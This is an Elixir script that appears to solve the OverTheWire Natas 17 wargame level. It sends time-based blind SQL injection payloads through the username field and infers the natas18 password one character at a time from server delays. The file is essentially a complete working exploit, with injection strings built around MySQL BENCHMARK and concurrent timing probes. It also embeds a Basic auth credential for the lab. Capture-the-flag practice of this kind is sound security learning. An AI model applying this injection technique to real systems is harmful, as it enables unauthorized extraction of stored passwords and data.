defmodule Natas17 do
  use Tesla

  plug(Tesla.Middleware.BaseUrl, "http://natas17.natas.labs.overthewire.org")

  plug(Tesla.Middleware.Headers,
    Authorization: "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
  )

  plug(Tesla.Middleware.FormUrlencoded)

  @all_chars ~S(ABCDEFGHIJKLMNOPQRSTUVXYWZabcdefghijklmnopqrstuvxwyz0123456789)
  @possible_chars ~S(CDFIKLMNOPRdghijlmpqsvxwy047)

  def start, do: crack_password("", :start)

  def crack_password(cracked_password, "") do
    print_password(cracked_password)
  end

  def crack_password(cracked_password, _discovered_char) do
    IO.puts("Senha descoberta: #{cracked_password}")

    next_char =
      String.split(@possible_chars, "", trim: true)
      |> Task.async_stream(fn char -> attempt_password(cracked_password, char) end,
        on_timeout: :kill_task,
        max_concurrency: 30,
        timeout: 7_500
      )
      |> Stream.with_index()
      |> Enum.to_list()
      |> Enum.filter(&match?({{_, :timeout}, _}, &1))
      |> Enum.map(fn {_, index} -> String.at(@possible_chars, index) end)
      |> Enum.join("")

    crack_password(cracked_password <> next_char, next_char)
  end

  def attempt_password(cracked_password, char_attempt) do
    try do
      :timer.sleep(1000)

      (cracked_password <> char_attempt)
      |> get_query
      |> post_data

      "Not Found"
    catch
      _ -> attempt_password(cracked_password, char_attempt)
    end
  end

  defp post_data(query) do
    form_data = %{"username" => query}
    post!("/index.php", form_data)
  end

  defp get_query_for_chars(password) do
    "natas18\" OR IF( (select count(*) from users where username = 'natas18' and password like binary '%#{
      password
    }%') > 0, BENCHMARK(120000000,ENCODE('MSG','by 5 seconds')), 2) -- "
  end

  defp get_query(password) do
    "natas18\" OR IF( (select count(*) from users where username = 'natas18' and password like binary '#{
      password
    }%') > 0, BENCHMARK(120000000,ENCODE('MSG','by 5 seconds')), 2) -- "
  end

  defp print_password(password) do
    IO.puts("**********************************")
    IO.puts("*      CARACTER DESCOBERTO!      *")
    IO.puts("**********************************\n\n")
    IO.puts("O password do Natas18 contém: " <> password)
    IO.puts("\n\n**********************************\n\n")
  end
end
